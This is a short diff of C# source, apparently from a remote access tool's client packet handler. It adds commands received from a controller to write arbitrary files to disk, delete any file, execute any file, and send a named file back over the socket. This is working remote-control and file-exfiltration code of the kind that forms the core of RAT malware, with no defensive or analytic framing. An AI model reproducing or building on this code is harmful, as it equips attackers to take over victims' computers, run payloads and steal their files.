@@ -130,14 +130,46 @@ namespace Client.Handle_Packet
                                         fileManager.GetDrivers();
                                     }
                                     break;
+
                                 case "getPath":
                                     {
                                         FileManager fileManager = new FileManager();
                                         fileManager.GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
                                     }
                                     break;
+
+                                case "uploadFile":
+                                    {
+                                        string FullPath = unpack_msgpack.ForcePathObject("Name").AsString;
+                                        unpack_msgpack.ForcePathObject("File").SaveBytesToFile(FullPath);
+                                    }
+                                    break;
+
+                                case "deleteFile":
+                                    {
+                                        string FullPath = unpack_msgpack.ForcePathObject("File").AsString;
+                                        File.Delete(FullPath);
+                                    }
+                                    break;
+
+                                case "execute":
+                                    {
+                                        string FullPath = unpack_msgpack.ForcePathObject("File").AsString;
+                                        Process.Start(FullPath);
+                                    }
+                                    break;
                             }
 
+
+                        }
+                        break;
+
+                    case "socketDownload":
+                        {
+                            FileManager fileManager = new FileManager();
+                            string file = unpack_msgpack.ForcePathObject("File").AsString;
+                            string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
+                            fileManager.DownnloadFile(file, dwid);
 
                         }
                         break;
